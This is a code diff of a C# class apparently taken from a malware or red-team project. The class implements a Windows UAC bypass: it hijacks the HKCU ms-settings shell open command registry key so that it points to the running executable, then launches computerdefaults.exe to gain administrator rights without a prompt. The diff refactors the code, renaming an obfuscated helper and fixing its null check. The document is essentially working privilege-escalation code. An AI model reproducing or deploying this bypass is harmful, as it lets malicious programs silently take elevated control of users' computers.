@@ -6,15 +6,14 @@ public class Bypass
 {
     public static void UAC()
     {
-        WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
-
-        if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
+        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
         {
-            Z("Classes");
-            Z("Classes\\ms-settings");
-            Z("Classes\\ms-settings\\shell");
-            Z("Classes\\ms-settings\\shell\\open");
-            RegistryKey registryKey = Z("Classes\\ms-settings\\shell\\open\\command");
+            Modify("Classes");
+            Modify("Classes\\ms-settings");
+            Modify("Classes\\ms-settings\\shell");
+            Modify("Classes\\ms-settings\\shell\\open");
+
+            RegistryKey registryKey = Modify("Classes\\ms-settings\\shell\\open\\command");
             string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
             registryKey.SetValue("", cpath, RegistryValueKind.String);
@@ -31,7 +30,7 @@ public class Bypass
                     Arguments = "/c start computerdefaults.exe"
                 });
             }
-            catch
+            catch 
             {
 
             }
@@ -40,27 +39,26 @@ public class Bypass
         }
         else
         {
-            RegistryKey registryKey2 = Z("Classes\\ms-settings\\shell\\open\\command");
+            RegistryKey registryKey2 = Modify("Classes\\ms-settings\\shell\\open\\command");
             registryKey2.SetValue("", "", RegistryValueKind.String);
         }
     }
 
-    public static RegistryKey Z(string x)
+    public static RegistryKey Modify(string x)
     {
-        try
-        {
-            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
+        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
 
-            if (registryKey != null)
-            {
-                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
-            }
-
-            return registryKey;
-        }
-        catch
+        if (!CheckSubKey(registryKey))
         {
-            return null;
+            registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
         }
+
+        return registryKey;
+    }
+
+    public static bool CheckSubKey(RegistryKey k)
+    {
+        bool flag = k == null;
+        return !flag;
     }
 }
